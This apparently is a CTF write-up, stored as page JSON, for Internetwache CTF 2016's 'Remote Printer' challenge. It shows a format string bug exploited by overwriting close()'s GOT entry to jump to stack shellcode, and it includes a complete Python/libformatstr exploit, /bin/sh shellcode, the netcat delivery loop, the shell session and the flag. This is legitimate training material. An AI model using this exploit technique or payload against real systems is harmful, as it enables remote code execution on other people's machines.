{"pageContext":{"html":"<p><a href=\"ctf=internetwasche-ctf-2016\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=format%20string\"></a>\n<a href=\"tools=libformatstr\"></a>\n<a href=\"techniques=format%20string\"></a></p>\n<h1>Remote Printer (exp-80)</h1>\n<blockquote>\n<p>Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.</p>\n</blockquote>\n<blockquote>\n<p>Attachment: exp80.zip</p>\n</blockquote>\n<blockquote>\n<p>Service: 188.166.133.53:12377</p>\n</blockquote>\n<p>Unzipping the <a href=\"/exp80-b0744ddf1c9e3b2fcb51dafb707fd368.zip\">file</a> gives us the following.</p>\n<p><code>bash $ file RemotePrinter RemotePrinter: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3db29aea1dc4af0eb3f7104e529f856256a1d775, stripped</code>\nIf we run it with\n<code>bash $ nc -l -p 8000 -vv</code>\nin another terminal.</p>\n<p><code>bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000</code></p>\n<p>gives us a connection on the listening port.\n<code>bash $ nc -l -p 8000 -vv listening on [any] 8000 ... connect to [127.0.0.1] from Hack-Machine [127.0.0.1] 38908 %p.%p.%p sent 9, rcvd 0</code></p>\n<p><code>bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000 Thank you, I'm trying to print 127.0.0.1:8000 now! 0xffc8425c.0x2000.(nil)</code>\nSo yeah! Format string exploitation!</p>\n<p>A quick decompilation with <a href=\"https://www.hopperapp.com/\">Hopper</a> gives us\n<code>c function sub_80486d5 { eax = *stdout; setbuf(eax, 0x0); puts(\"This is a remote printer!\"); printf(\"Enter IPv4 address:\"); __isoc99_scanf(0x804896e, var_18); printf(\"Enter port:\"); __isoc99_scanf(0x804897f, 0x0); printf(\"Thank you, I'm trying to print %s:%d now!\\n\", var_18, 0x0); esp = (((((((esp - 0x8 - 0x4 - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x8 - 0x4 - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x8 - 0x4 - 0x4) + 0x10 - 0x4 - 0x4 - 0x4 - 0x4) + 0x10; sub_8048786(var_18, 0x0); return 0x0; } function sub_8048786 { esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10; var_C = socket(0x2, 0x1, 0x0); if (var_C == 0xffffffff) { puts(\"No socket :(\"); } else { inet_addr(arg0); htons(); esp = (((esp - 0xc - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x4 - 0x4 - 0x4 - 0x4) + 0x10; if (connect(var_C, 0x2, 0x10) &#x3C; 0x0) { perror(\"No communication :(\\n\"); } else { esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10; if (recv(var_C, var_201C, 0x2000, 0x0) &#x3C; 0x0) { puts(\"No data :(\"); } else { printf(var_201C); close(var_C); } } } return; }</code>\nLets checksec.</p>\n<p><code>bash $ gdb -q ./RemotePrinter Reading symbols from ./RemotePrinter...(no debugging symbols found)...done. gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : disabled</code>\nSo NX is disabled. This means we can execute shellcode on the stack.</p>\n<p>So a brief strategy : By overwriting a GOT entry for a function the program will use after\nthe printf call we can seize control and\ncan jump to shellcode address.</p>\n<p>So here we see printf() is followed by close(). We'll patch the GOT entry for close() to execute our shellcode.</p>\n<p>`<code></code>bash\n$ readelf -r ./RemotePrinter</p>\n<p>Relocation section '.rel.dyn' at offset 0x408 contains 2 entries:\nOffset     Info    Type            Sym.Value  Sym. Name\n08049c34  00000806 R<em>386</em>GLOB_DAT    00000000   <strong>gmon_start</strong>\n08049c8c  00001105 R<em>386</em>COPY        08049c8c   stdout</p>\n<p>Relocation section '.rel.plt' at offset 0x418 contains 16 entries:\nOffset     Info    Type            Sym.Value  Sym. Name\n08049c44  00000107 R<em>386</em>JUMP<em>SLOT   00000000   setbuf\n08049c48  00000207 R</em>386<em>JUMP</em>SLOT   00000000   printf\n08049c4c  00000307 R<em>386</em>JUMP<em>SLOT   00000000   fgets\n08049c50  00000407 R</em>386<em>JUMP</em>SLOT   00000000   fclose\n08049c54  00000507 R<em>386</em>JUMP<em>SLOT   00000000   htons\n08049c58  00000607 R</em>386<em>JUMP</em>SLOT   00000000   perror\n08049c5c  00000707 R<em>386</em>JUMP<em>SLOT   00000000   puts\n08049c60  00000807 R</em>386<em>JUMP</em>SLOT   00000000   <strong>gmon_start</strong>\n08049c64  00000907 R<em>386</em>JUMP_SLOT   00000000   _<em>libc</em>start<em>main\n08049c68  00000a07 R</em>386<em>JUMP</em>SLOT   00000000   fopen\n08049c6c  00000b07 R<em>386</em>JUMP_SLOT   00000000   _<em>isoc99</em>scanf\n08049c70  00000c07 R<em>386</em>JUMP<em>SLOT   00000000   socket\n08049c74  00000d07 R</em>386<em>JUMP</em>SLOT   00000000   inet<em>addr\n08049c78  00000e07 R</em>386<em>JUMP</em>SLOT   00000000   connect\n08049c7c  00000f07 R<em>386</em>JUMP<em>SLOT   00000000   recv\n08049c80  00001007 R</em>386<em>JUMP</em>SLOT   00000000   close\n`<code></code>\nFirst we need to locate our input on the stack. A little checking reveals that the first thing on the stack at printf() is the address of our input. Also we can see that ASLR is not enabled on the service as the address remains constant for 5-6 tries (0xffffbcec).</p>\n<p>The exploit is pretty straight-forward :</p>\n<p>`<code></code>python</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>from pwn import *\nshell=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\nfrom libformatstr import *\np=FormatStr()\np[0x08049c80]=0xffffbcec+0x30\npay=p.payload(7,0)\nprint repr(pay+'\\x90'*50+shell)\n'%48412c%14$hn%17123c%15$hnAA\\x80\\x9c\\x04\\x08\\x82\\x9c\\x04\\x08\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe3PS\\x89\\xe1\\xb0\\x0b\\xcd\\x80'</p>\n<p>`<code></code></p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>Now the exploit in action :\n<code>bash $for i in {1..100}; do python -c \"print '%48412c%14\\$hn%17123c%15\\$hnAA\\x80\\x9c\\x04\\x08\\x82\\x9c\\x04\\x08\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe3PS\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\"| nc -vv -l -p 443 ; done Listening on [0.0.0.0] (family 0, port 443) Connection from [178.62.254.108] port 443 [tcp/https] accepted (family 2, sport 34495)</code></p>\n<p>we get a shell\n<code>id uid=1010(exp80) gid=1010(exp80) groups=1010(exp80) ls RemotePrinter flag.txt cat flag.txt IW{YVO_F0RmaTt3d_RMT_Pr1nT3R} uname -a Linux serv1.2016.ctf.internetwache.org 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt20-1+deb8u3 (2016-01-17) x86_64 GNU/Linux</code></p>\n<p>flag</p>\n<blockquote>\n<p>IW{YVO<em>F0RmaTt3d</em>RMT_Pr1nT3R}</p>\n</blockquote>","relativePath":"writeups/internetwache-ctf-2016/exploit/remote-printer/sudhackar"}}